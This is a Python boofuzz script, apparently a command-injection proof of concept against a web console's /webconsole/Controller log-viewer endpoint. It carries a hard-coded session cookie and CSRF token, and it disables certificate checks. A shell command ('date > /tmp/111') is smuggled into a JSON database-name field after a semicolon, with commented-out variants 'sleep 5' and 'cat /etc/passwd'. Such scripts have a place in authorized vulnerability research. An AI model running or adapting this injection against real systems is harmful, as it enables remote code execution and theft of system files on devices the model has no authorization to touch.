from boofuzz import Session, Target, SocketConnection, s_initialize, s_static, s_delim, s_string
from boofuzz import *
import ssl
import time


def resp(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    try:
        print(target.recv(2048).decode())
        print("~" * 33)
        fuzz_data_logger.log_check(session.last_send)
        # if 'redirectionURL' in target.recv(10240).decode():
        #     fuzz_data_logger.log_check(session.last_send)
    except:
        fuzz_data_logger.log_fail("Unable to connect ...")
        return

    print('--' * 66)


def main():
    # 目标主机的 IP 地址和端口号
    target_ip = "172.16.16.16"
    target_port = 4444

    c = "b0vrafyc7gpeut8zfuqam4p7"
    token = "scfaq2dvau7vlidnm7k4gdpsg9"

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=target_ip, port=target_port, sslcontext=ctx,recv_timeout=15)),
        restart_threshold=1,
        post_test_case_callbacks=[resp],
        # post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        # pre_send_callbacks=[gt],
        sleep_time=0.2
    )



    s_initialize(name='rce_fuzz')

    with s_block("Request-Line"):
        # s_static(
        #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(target_ip, target_port))

        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {target_ip}:{target_port}\r\n")
        s_static(f"Cookie: JSESSIONID={c}\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static(f"X-Csrf-Token: {token}\r\n")
        s_static("Content-Length: 308\r\n")
        s_static(f"Origin: https://{target_ip}:{target_port}\r\n")
        s_static(
            f"Referer: https://{target_ip}:{target_port}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Te: trailers\r\n")
        s_static("Connection: close\r\n")

        # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body_content'):
        s_static(
            "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
        # s_static('sleep%205')
        # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
        s_static('date%20%3E%20%2Ftmp%2F111')
        s_static(
            f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
        s_random(min_length=1, max_length=1)  # just add for launch fuzzer

    session.connect(s_get('rce_fuzz'))
    session.fuzz()
    print("-------")

if __name__ == "__main__":
    main()